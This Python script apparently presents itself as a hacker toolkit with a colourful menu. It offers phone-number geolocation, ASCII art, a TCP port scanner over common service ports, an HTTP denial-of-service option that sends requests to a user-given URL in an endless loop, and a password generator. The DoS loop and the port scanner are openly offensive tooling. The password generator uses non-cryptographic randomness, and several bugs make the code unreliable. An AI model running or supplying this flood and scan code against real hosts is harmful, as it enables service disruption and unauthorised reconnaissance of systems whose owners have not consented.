from colorama import Fore, Style
from phonenumbers import parse
from phonenumbers import geocoder
from phonenumbers import carrier
import string
import random
import socket
import pyfiglet
import time
from socket import *
from time import sleep
from tqdm import tqdm
import requests
import time
import os
import subprocess












print(Fore.RED+'[*_*]    >>>>    Made by Organization ((YHI 547)) '+Style.RESET_ALL)
print(Fore.MAGENTA)        
print('    __             _                         __  ')
print('   / /   ___   ___| |_ ___  _ __  _   _ ___  \ \ ')
print('  | |   / _ \ / __| __/ _ \|     | | | | __|  | |')
print('  | |  | (_) | (__| || (_) | |_) | |_| \__ \  | |')
print('  | |   \___/ \___|\__\___/| .__/ \__,_|___/  | |')
print('   \_\                     |_|               /_/ ')
print('                                      YHI547     ')
print(Style.RESET_ALL+'')



print(Fore.GREEN)
for i in tqdm(range(100)):
    sleep(0.05)
print(Fore.GREEN+'[1]  $Find by number ')
print('[2]  $Make word for code ')
print('[3]  $scan port')
print('[4]  $attack Dos packet(HTTP)')
print('[5]  $make password'+Style.RESET_ALL)

print(Fore.RED+'[0]  $Exit'+Style.RESET_ALL)


######################
def number_1():
    print(Fore.GREEN+'$ ok, start the find by number ')
    print("$ >> +98, +55 ,...")
    p = input('Enter Phone number: '+Style.RESET_ALL)
    num = parse(p)
    print(Fore.GREEN+geocoder.description_for_number(num, 'en'))
    print(carrier.name_for_number(num, 'en' + Style.RESET_ALL))
######################
def number_2():
    print(Fore.GREEN+'$ ok, start the  Make word for code  ')

    print('')
    t = input("$Enter your word :  "+Style.RESET_ALL)
    print(pyfiglet.figlet_format(t))
##############################

##############################
def number_3():
    print(Fore.RED+'[+_+] click number 1 ==> exit')
    print('$ok, go to scan port')
    ip = input('Enter your ip :'+Style.RESET_ALL)
    print(Fore.GREEN+'Scaning, wait a few seconds, my frind :) '+Style.RESET_ALL)
    ipn = gethostbyname(ip)
    for i in [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,20,24,26,69,79,88,109,119,137,138,161,389,636,873,902,993,1025,1080,1433,1521,2049,2121,2222,2601,3128,3300,3388,5432,5901,6000,6667,8000,8008,8443,8888,9000,9090,10000,32768]:

        s = socket(AF_INET, SOCK_STREAM)
        s.settimeout(3)
        re = s.connect_ex((ip, i))
        if (re == 0):
            print(Fore.RED ,f'open port > '+Style.RESET_ALL,Fore.GREEN+'',{i})
            
##################################
def number_4():
    print(Fore.RED+'[+_+] Ctrl + C = exit')
    print('$ ok g to attck Dos (HTTP)')
    print('$ (http://x.x.x.x:8080,4342, . . .)')
    print(''+Style.RESET_ALL)
    ipa = input(Fore.GREEN+'ip addres for attck Dos = ')
    while True:
        t = requests.get(ipa)
        print(t.status_code)
        
###################################
def number_5():
    length = int(input(Fore.RED+'your number characters for make password : '))
    characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(characters) for _ in range(length))
    print('your password :'+Style.RESET_ALL,Fore.GREEN + password)
    print(Style.RESET_ALL)
##################################

#########################
def number_0():
    print(Fore.GREEN+'ok Exit. . .'+Style.RESET_ALL)
    exit()
##################
numbersat = {
    number_1 : 1,
    number_2 : 2,
    number_3 : 3,
    number_4 : 4,
    number_5 : 5,
    number_0 : 0
    }

try:
    number = int(input(Fore.YELLOW+'$Enter number :  '+Style.RESET_ALL))
    if number == 1 :
        number_1()
    if number == 2 :
        number_2()
    if number == 3:
        number_3()
    if number == 4:
        number_4()
    if number == 5:
        number_5()
    if number == 0:
        number_0()
    select_number = numbersat.get(number, lambda: print(''))
    select_number()

except ValueError:
    print(Fore.RED+'$Please, Enter only numbers'+Style.RESET_ALL)

